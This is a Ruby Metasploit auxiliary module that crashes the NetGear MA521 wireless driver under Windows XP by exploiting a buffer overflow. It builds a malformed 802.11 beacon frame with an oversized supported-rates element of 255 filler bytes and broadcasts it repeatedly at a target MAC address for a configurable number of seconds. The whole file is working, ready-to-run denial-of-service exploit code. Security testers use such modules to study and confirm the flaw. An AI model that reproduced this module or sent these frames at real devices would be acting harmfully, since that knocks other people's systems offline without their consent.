require 'msf/core'

module Msf

class Auxiliary::Dos::Wireless::Netgear_MA521_Rates < Msf::Auxiliary

	include Exploit::Lorcon

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'NetGear MA521 Wireless Driver Long Rates Overflow',
			'Description'    => %q{
				This module exploits a buffer overflow in the NetGear MA521 wireless device
				driver under Windows XP. When a specific malformed frame (beacon or probe response)
				is received by the wireless	interface under active scanning mode, the MA521nd5.SYS 
				driver attempts to write to	an attacker-controlled memory location. The vulnerability
				is triggered by an invalid supported rates information element.
				
				This DoS was tested with version 5.148.724.2003 of the MA521nd5.SYS driver and a 
				NetGear MA521 PCMCIA adapter. A remote code execution module is also in development.

				This module depends on the Lorcon library and only works on the Linux platform
				with a supported wireless card. Please see the Ruby Lorcon documentation 
				(external/ruby-lorcon/README) for more information.
			},
			
			'Author'         => [ 'Laurent Butti <0x9090 [at] gmail.com>' ], # initial discovery and metasploit module
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					['URL', 'http://projects.info-pull.com/mokb/MOKB-18-11-2006.html'],
					['URL', 'ftp://downloads.netgear.com/files/ma521_1_2.zip']
				] 
		))
		register_options(
			[
				OptInt.new('RUNTIME', [ true, "The number of seconds to run the attack", 60]),
				OptString.new('ADDR_DST', [ true,  "The MAC address of the target system", 'FF:FF:FF:FF:FF:FF'])
			], self.class)					
	end

	def run

		open_wifi

		stime = Time.now.to_i
		rtime = datastore['RUNTIME'].to_i
		count = 0

		print_status("Creating malicious beacon frame...")

		frame = create_beacon()

		print_status("Sending malicious beacon frames for #{datastore['RUNTIME']} seconds...")

		while (stime + rtime > Time.now.to_i)
			wifi.write(frame)
			select(nil, nil, nil, 0.10) if (count % 100 == 0)
			count += 1
		end

		print_status("Completed sending #{count} beacons.")
	end

	def create_beacon
		ssid     = Rex::Text.rand_text(6)
		bssid    = Rex::Text.rand_text(6)
		channel  = datastore['CHANNEL'].to_i
		seq      = [rand(255)].pack('n')
		
		frame = 
			"\x80" +                      # type/subtype
			"\x00" +                      # flags
			"\x00\x00" +                  # duration  
			eton(datastore['ADDR_DST']) + # dst
			bssid +                       # src
			bssid +                       # bssid
			seq   +                       # seq  
			Rex::Text.rand_text(8) +      # timestamp value
			"\x64\x00" +      	          # beacon interval
			"\x01\x00" +		          # capabilities

		# ssid IE
		"\x00" + ssid.length.chr + ssid	+

		# supported rates IE overflow
		"\x01" + "\xFF" + ("\x41" * 255) +

		# channel IE
		"\x03" + "\x01" + channel.chr
		
		return frame

	end
end
end
